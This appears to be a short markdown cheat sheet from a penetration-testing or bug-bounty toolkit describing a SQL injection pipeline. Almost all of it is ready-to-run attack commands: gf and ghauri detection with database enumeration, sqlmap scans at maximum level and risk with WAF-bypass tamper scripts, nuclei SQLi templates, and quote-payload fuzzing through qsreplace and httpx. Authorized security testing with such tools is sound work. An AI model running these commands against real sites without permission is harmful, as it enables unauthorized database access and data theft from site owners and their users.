# SQL Injection (SQLi) Pipeline

> **Tip:** Use `setup_audit.sh` to generate the `target` file.
> Example: `export TARGET=$(cat target)`

## 1. Identification
Find URLs with parameters that might be vulnerable.

```bash
# GF Patterns
gf sqli < live_urls.txt > sqli_candidates.txt

# Ghauri (Detection)
ghauri -m -r sqli_candidates.txt --level 3 --dbs --batch --confirm
```

## 2. Automated Scanning (SQLMap)
The gold standard for SQLi detection and exploitation.

```bash
# Basic Scan
sqlmap -m sqli_candidates.txt --batch --random-agent --level 1 --risk 1

# Advanced Scan (WAF Bypass)
# Use tamper scripts if WAF is suspected
sqlmap -m sqli_candidates.txt --batch --random-agent --level 5 --risk 3 --tamper=between,randomcase,space2comment
```

## 3. Nuclei SQLi
Use Nuclei's specific SQLi templates for faster scanning.

```bash
nuclei -l live_urls.txt -tags sqli -o scans/nuclei_sqli.txt
```

## 4. Error-Based Fuzzing
Manually or automatically inject characters to trigger errors.

```bash
# QSReplace with common SQLi payloads
cat sqli_candidates.txt | qsreplace "'" | httpx -silent -mc 500 -o potential_sqli_500.txt
cat sqli_candidates.txt | qsreplace '"' | httpx -silent -mc 500 >> potential_sqli_500.txt
```
